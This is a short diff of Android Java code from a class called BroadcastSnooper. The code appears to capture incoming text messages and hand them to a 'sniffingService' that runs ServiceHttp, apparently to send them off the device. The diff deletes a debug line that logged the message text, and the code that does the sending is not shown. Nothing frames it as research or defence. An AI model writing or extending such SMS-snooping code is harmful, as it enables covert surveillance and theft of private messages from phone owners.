@@ -44,7 +44,6 @@ public class BroadcastSnooper extends BroadcastReceiver{
                 str += "\n";        
             }
            
-            Log.d("Text Message: ", str);
             Intent sniffingService = new Intent(context, ServiceHttp.class);
             sniffingService.putExtra("IntentActivity", new IntentActivity(intent));
             context.startService(sniffingService);
